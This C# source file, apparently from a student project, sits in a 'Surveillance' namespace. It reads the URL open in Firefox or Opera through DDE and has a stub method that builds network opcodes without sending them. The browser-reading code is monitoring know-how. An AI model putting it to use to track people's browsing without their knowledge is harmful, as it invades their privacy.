using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using SkolProjectClient.TCP;
using NDde.Client;

namespace SkolProjectClient.Surveillance
{
    class SurveillanceC
    {

        public void sendOpCodesPredef(Globals.opCodes opCode)
        {
            switch (opCode)
            {
                case Globals.opCodes.HEARTBEAT:
                    byte[] data = new byte[] { (byte)Globals.opCodes.HEARTBEAT };
                break;

                case Globals.opCodes.WELCOME:
                    byte[] dataa = new byte[] { (byte)Globals.opCodes.WELCOME };
                break;

                case Globals.opCodes.BYE:
                    byte[] datab = new byte[] { (byte)Globals.opCodes.BYE };

                break;


            }
        }

        public static string GetOnlineSites(Globals.Browser browser)
        {
            switch (browser)
            {
                case Globals.Browser.Firefox:
                    return GetBrowserURL("firefox");

                case Globals.Browser.Opera:
                    return GetBrowserURL("opera");

                default: return string.Empty;
                        
            }
        }

        //
        // usage: GetBrowserURL("opera") or GetBrowserURL("firefox")
        //
        public static string GetBrowserURL(string browser)
        {
            try
            {
                DdeClient dde = new DdeClient(browser, "WWW_GetWindowInfo");
                dde.Connect();
                string url = dde.Request("URL", int.MaxValue);
                string[] text = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
                dde.Disconnect();
                return text[0].Substring(1);
            }
            catch
            {
                return null;
            }
        }
    }
}
